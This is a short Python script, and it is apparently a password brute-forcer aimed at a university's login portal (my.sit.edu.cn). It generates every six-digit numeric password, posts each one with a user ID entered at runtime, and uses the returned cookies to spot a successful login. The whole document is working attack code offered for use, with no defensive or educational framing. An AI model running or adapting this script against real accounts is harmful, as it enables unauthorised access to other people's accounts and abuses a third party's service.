#coding=utf-8
import requests
import itertools

def main(user):
    words = "1234567890"
    passwd = itertools.product(words, repeat = 6)
    with open("sit.txt", "a") as dic:
        for word in passwd:
            dic.write("".join(word))
            dic.write("\n")
    lines = open("sit.txt", "r") 
    for password in lines:
        sess = requests.session()
        url = "http://my.sit.edu.cn/userPasswordValidate.portal"
        headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linu…) Gecko/20100101 Firefox/58.0"}
        data = {
            "Login.Token1" : user,
            "Login.Token2" : password,
            "goto" : "http://my.sit.edu.cn/loginSuccess.portal",
            "gotoOnFail" : "http://my.sit.edu.cn/loginFailure.portal"
        }
        response = sess.post(url, headers = headers, data = data).cookies
        a = len(response)
        if a == 0:
            print(password)
        else:
            print("ERROR : " + password)

if __name__ == "__main__":
    user = raw_input("Please input ID :")
    main(user)